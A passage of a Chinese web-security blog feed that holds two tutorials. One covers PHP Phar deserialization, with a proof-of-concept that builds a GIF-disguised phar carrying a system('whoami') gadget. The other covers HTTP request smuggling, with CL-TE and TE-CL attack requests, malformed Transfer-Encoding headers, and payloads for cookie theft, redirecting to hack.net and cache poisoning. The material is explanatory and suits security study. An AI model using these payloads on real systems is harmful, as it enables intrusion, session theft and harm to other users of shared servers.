    <content type="html"><![CDATA[<p>Phar是打包的PHP文件，跟Java的JAR包类似。通过文件类函数和<code>phar://</code>伪协议可以对phar文件进行读写等操作，如果 <code>phar.readonly</code> 为禁用则可以生成phar文件，但出于安全考虑该配置默认为启用。</p><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>根据<a href="https://www.php.net/manual/en/phar.fileformat.phar.php">官方文档</a>可知，Phar由 <code>stub</code>/<code>manifest</code>/<code>contents</code>/<code>signature</code> 四部分组成。</p><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><p><code>stub</code> 用于标识phar文件类型，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>（xxx为任意内容）。因为无需以特定标识开头，所以可以结合其它文件头进行伪装：<code>GIF89a&lt;?php __HALT_COMPILER();?&gt;</code>。</p><h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>该结构存放了一些phar文件的大小长度等属性，包括序列化格式的元数据。</p><h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p><code>contents</code> 存放压缩后的实际文件内容。</p><h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>顾名思义该结构用于文件校验，可以是常见的哈希值或密钥签名。</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>因为 <code>manifest</code> 中的 <code>Meta-data</code> 以序列化格式存储，那么读取时必然有反序列化的过程，如果该部分用户可控（如上传phar文件并引用），则存在反序列化漏洞。</p><ul><li><a href="https://github.com/php/php-src/commit/0c238ede019f6ffbe7c996ec1695a747f4bca966">PHP8.0</a> 改为了不自动反序列化 <code>Meta-data</code>，除非调用了 <code>getMetadata()</code></li></ul><h3 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $call;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call = <span class="keyword">new</span> Normal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ddmddw!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Run</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$path = <span class="string">&#x27;phar://test.phar&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span>($path);</span><br><span class="line">file_exists($path);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Control</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $call;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call = <span class="keyword">new</span> Run();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;call-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Run</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code = <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> Control();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建新的test.phar文件</span></span><br><span class="line">@unlink(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="comment">// 开始初始化过程</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"><span class="comment">// 添加要打包压缩的文件</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="comment">// 插入伪装过的头部标识</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// 插入Meta-data并序列化</span></span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line"><span class="comment">// 生成phar文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>附上l1nk3r师傅总结的常用魔术方法触发条件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup()      <span class="comment">//使用unserialize时触发</span></span><br><span class="line">__sleep()       <span class="comment">//使用serialize时触发</span></span><br><span class="line">__destruct()    <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call()        <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic()  <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get()         <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set()         <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset()       <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset()       <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString()    <span class="comment">//把类当作字符串使用时触发,返回值需要为字符串</span></span><br><span class="line">__invoke()      <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Phar是打包的PHP文件，跟Java的JAR包类似。通过文件类函数和&lt;code&gt;phar://&lt;/code&gt;伪协议可以对phar文件进行读写等操作，如果 &lt;code&gt;phar.readonly&lt;/code&gt; 为禁用则可以生成phar文件，但出于安全考虑该配置默认为启用。&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
    <category term="phar" scheme="https://hosch3n.github.io/tags/phar/"/>
    
  </entry>
  
  <entry>
    <title>HTTP请求走私</title>
    <link href="https://hosch3n.github.io/2020/08/16/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <id>https://hosch3n.github.io/2020/08/16/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
    <published>2020-08-16T14:29:15.000Z</published>
    <updated>2021-03-01T09:44:16.605Z</updated>
    
    <content type="html"><![CDATA[<p>聊HTTP请求走私之前，需要先思考一个问题：HTTP请求如何标识一个请求的结束（尤其是POST请求）</p><p>一种是通过 <code>Content-Length</code> 请求头 的值界定请求体的长度，另一种是在<a href="https://zh.wikipedia.org/zh-hans/%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BC%96%E7%A0%81">分块传输</a>时，通过 <code>Transfer-Encoding: chunked</code> 请求头与请求体最后一行的 <code>0\r\n\r\n</code> 来标识该请求的结束(不计入请求体长度)</p><p>按照<a href="https://tools.ietf.org/html/rfc2616#section-4.4">HTTP/1.1规范标准</a>，这两种请求头同时存在时应该忽略 <code>Content-Length</code> 而以分块传输为准，但是对于反代链中的多个服务器而言，可能有些并不支持分块传输请求头、有些对于标准规范的实现并未足够精细，在处理一些畸形请求头时会有非预期的效果。</p><blockquote><p>为了方便表述，接下来均将用于反向代理的服务器称为前端，隐藏在反代服务器之后用于提供具体业务的服务器称为后端。用 <code>CL-TE</code> 表示前端以 <code>Content-Length</code> 作为请求结束界定标准、<code>TE-CL</code> 表示前端以 <code>Transfer-Encoding</code> 作为请求结束界定标准。</p></blockquote><p>HTTP请求走私漏洞正是由于前后端服务器界定标准不一致导致的，利用HTTP请求走私使得 <code>一次攻击</code> 在前端服务器识别为 <code>一个请求</code> ，但传送到后端服务器时其误认为这是用了<a href="https://zh.wikipedia.org/zh-cn/HTTP%E7%AE%A1%E7%B7%9A%E5%8C%96">pipelining</a>，而将其识别为 <code>两个不同的请求</code>。</p><ul><li>更深入的细节原理，涉及到反代和后端对于消息的处理机制，这部分现在还不懂，以后懂了再单独分析</li></ul><h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 50</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line">q=something</span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /404 HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><ol start="0"><li><p>前端读取 <code>CL</code> 值为50，会将这一整段视为一个请求转发至后端( <code>0</code> 及之后的部分会被认作是该请求的请求体内容)</p></li><li><p>后端接收时以 <code>TE</code> 作为界定标准，将 <code>0\r\n\r\n</code> 视为一个请求的结束，将后续部分视作下一个传输过来的请求</p></li><li><p>由于我们构造的后面这个请求的包结构并不完整，所以后端认为这份数据还没有接收完毕，会继续将随后到来的请求拼接进去</p></li><li><p>注意 <code>CL</code> 取值为50时，是截止到最后一行的最后一个字母 <code>t</code> 的，也就是说 <code>t</code> 后面并不存在 <code>\r\n</code> 这对回车换行符，那么后端随后紧接而来的请求实际上会被拼接成这种样子：</p></li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /search HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 11</span><br><span class="line"></span><br><span class="line">q=something</span><br></pre></td></tr></table></figure><p>这就导致了后续对 <code>/search</code> 的访问，因为请求行被吃进了 <code>X-Ignore</code> 这个请求头的值中，拼接后实际变成了对 <code>/404</code> 的访问。</p><p>从理论上来说，我们可以发出请求走私攻击包后，紧接着发送一个正常请求，根据后者不正常的响应差异来判断漏洞存在。</p><p>在实战中我们的攻击请求和紧接着发送的正常请求之间，很可能会有其他人的某个请求刚好插在了中间，这样我们本来期待用于判断漏洞的不正常响应就会被回复给别人，影响别人正常使的同时还会导致我们误以为没洞，所以最好避开高峰期多试几次。</p><ul><li>或者<a href="https://portswigger.net/web-security/request-smuggling/finding">基于响应时间来判断</a></li></ul><h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-length</span>: 13</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line">q=something</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line"><span class="attribute">0</span></span><br></pre></td></tr></table></figure><ol start="0"><li><p>前端以 <code>TE</code> 作为界定标准，会将这一整段视为一个请求转发至后端( <code>q=something</code> 及之后的部分会被认作是该请求的请求体内容)</p></li><li><p>前端读取 <code>CL</code> 值为13，认为第一个请求截止到 <code>q=something</code>，将后续部分视作下一个传输过来的请求</p></li><li><p>由于我们构造的后面这个请求的 <code>CL</code> 值为15，所以后端认为这份数据还没有接收完毕，会继续在随后到来的请求中取出5个字符拼接进去</p></li><li><p>后端随后紧接而来的请求实际上会被拼接成这种样子：</p></li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/404</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">POST[空格]</span></span><br></pre></td></tr></table></figure><p>于是就使得后续请求被截断，剩下的不完整部分会被视为无效请求丢弃，最终会得到一个不正常的响应。（同样存在前文中说的竞争问题，缓解方法一样）</p><h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p>从原理来看前后端标准一致时是不存在请求走私的，但如果一个接受畸形 <code>TE</code> 认为是分块传输，一个不接受畸形 <code>TE</code> 而按照 <code>CL</code> 的值作为请求结束界定标准，这种细微差异同样会导致请求走私，PortSwigger 提供了部分在实战中成功利用过的畸形头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span>: xchunked</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding : chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: x</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding:[tab]chunked</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X</span>: X[\n]Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span></span><br><span class="line"><span class="attribute"></span>: chunked</span><br></pre></td></tr></table></figure><ul><li>在<a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646">Burp插件</a>中存在更多畸形 <code>TE</code> 头用于Fuzz，可以自动计算 <code>CL</code> 长度和配合 <code>Turbo Intruder</code> 光速发包，真香</li></ul><p>利用畸形 <code>TE</code> 导致的差异化解析，最终还是会对应 <code>CL-TE</code> 或 <code>TE-CL</code> 的情况，就不再贴数据包了(就是改一下 <code>TE</code> 头)。</p><h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>最直接的就是用来绕过前端的安全访问控制，让走私的请求直达业务逻辑后端。但是实战中可能没有这么理想化，比如后端还是会校验 <code>client-ip</code> 、 <code>x-forwarded-for</code> 或是反代加的自定义请求头，这时就需要找到一个能够回显请求体参数的地方，利用请求走私中的第二个 <code>不完整</code> 请求吃掉紧接而来的下一个请求，通过直接或间接的回显读到需要的请求头。</p><p>比如在一个搜索功能中，POST请求的 <code>q</code> 参数的内容表示搜索的字符串，这个字符串在搜索页会被 <code>直接回显</code> 或是存储到搜索记录中 <code>间接回显</code>。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 159</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 200</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">a=x&amp;b=y&amp;c=z&amp;q=something</span><br></pre></td></tr></table></figure><p>重点注意第二个走私请求中 <code>CL</code> 值被设置得偏大，且有回显的 <code>q</code> 参数被移到了末尾，后端随后紧接而来的请求实际上会被拼接成这种样子：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 100</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">a=x&amp;b=y&amp;c=z&amp;q=somethingPOST /search HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xx.net</span><br><span class="line"><span class="attribute">X-Secret-Header</span>: 666</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>...</code>中有多少内容取决于走私请求中 <code>CL</code> 值的大小，建议根据需要慢慢调大，避免过大导致超时(在这个例子中我们已经读到了需要的 <code>X-Secret-Header: 666</code> 这个前端服务器自定义校验头)，但是调大 <code>CL</code> 值能读到的东西最多截止到遇到 <code>&amp;</code> 时（想想HTTP请求用什么符号区分不同参数？我们能回显什么参数？）</p><p>至于这个 <code>随后紧接而来的请求</code> 该由我们发出，还是守株待兔等着别人的访问请求进坑，就要看具体的目的是什<br>么了。</p><h3 id="窃取Cookie"><a href="#窃取Cookie" class="headerlink" title="窃取Cookie"></a>窃取Cookie</h3><p>如果是想要打到别人的私有请求头(比如 <code>Cookie</code> 之类的)，那就得等人进坑且需要一个存储型的间接回显点，因为一次性的直接回显会直接响应给受害者，我们是看不到的。</p><ul><li>存储型间接回显点举例:搜索记录、个人简介、发布文章、发布评论、发送私信</li></ul><h3 id="水坑型XSS"><a href="#水坑型XSS" class="headerlink" title="水坑型XSS"></a>水坑型XSS</h3><p>如果实在没有存储型间接回显点的话，那就充分利用一次性直接回显这个特点，配合一个反射型XSS使其变为无条件触发的 <code>水坑型XSS</code> （我自己编的名）</p><ul><li>反射型XSS漏洞点可以是常规的GET或POST参数，同样也可以是像 <code>User-Agent</code> 头这种self触发点，因为结合请求走私我们可以实现将它强加给下一个访问的受害者</li></ul><h3 id="任意重定向"><a href="#任意重定向" class="headerlink" title="任意重定向"></a>任意重定向</h3><p>如果配合 <code>Apache</code> 和 <code>IIS</code> 会将无斜杠路径通过重定向方式添加斜杠的特性，就可以再次利用请求走私给下一个访问的受害者强加头部，通过重定向将其劫持到任意域名下。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 54</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /evil HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: hack.net</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><p>下一个受害者的访问请求会被拼接成这种样子:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/evil</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: hack.net</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /a.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">301</span> Moved Permanently</span><br><span class="line"><span class="attribute">Location</span>: https://hack.net/evil/</span><br></pre></td></tr></table></figure><h3 id="Web缓存投毒"><a href="#Web缓存投毒" class="headerlink" title="Web缓存投毒"></a>Web缓存投毒</h3><p>同时，对于 <code>/a.js</code> 的访问请求还可能被缓存下来，使得之后每个不受请求走私影响的后续请求，同样受到重定向劫持的影响，进一步造成Web缓存投毒：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/a.js</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">301</span> Moved Permanently</span><br><span class="line"><span class="attribute">Location</span>: https://hack.net/evil/</span><br></pre></td></tr></table></figure><h3 id="Web缓存水坑"><a href="#Web缓存水坑" class="headerlink" title="Web缓存水坑"></a>Web缓存水坑</h3><p>回过头来，之前没找到回显点打敏感数据的话，也可以再再次利用请求走私给下一个访问的受害者强加头部，结合Web缓存特性将其敏感数据缓存下来窃取。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 43</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /getapikey HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eat</span><br></pre></td></tr></table></figure><p>下一个受害者的访问请求会被拼接成这种样子:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/getapikey</span> HTTP/1.1</span><br><span class="line"><span class="attribute">X-Ignore</span>: eatPOST /any.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.net</span><br><span class="line"><span class="attribute">Cookie</span>: sessionId=balabalabala</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>受害者的 <code>/getapikey</code> 中的信息会被缓存至 <code>/any.js</code> 中，但是一个问题是攻击者并不知道受害者是访问的 <code>/any.js</code>，所以可能需要遍历几乎所有静态文件分析= =</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;聊HTTP请求走私之前，需要先思考一个问题：HTTP请求如何标识一个请求的结束（尤其是POST请求）&lt;/p&gt;
&lt;p&gt;一种是通过 &lt;code&gt;Content-Length&lt;/code&gt; 请求头 的值界定请求体的长度，另一种是在&lt;a href=&quot;https://zh.wikip</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="http" scheme="https://hosch3n.github.io/tags/http/"/>
    
    <category term="smuggling" scheme="https://hosch3n.github.io/tags/smuggling/"/>
    
  </entry>
  
  <entry>
    <title>XML基础与XXE注入</title>
    <link href="https://hosch3n.github.io/2020/08/16/XML%E5%9F%BA%E7%A1%80%E4%B8%8EXXE%E6%B3%A8%E5%85%A5/"/>
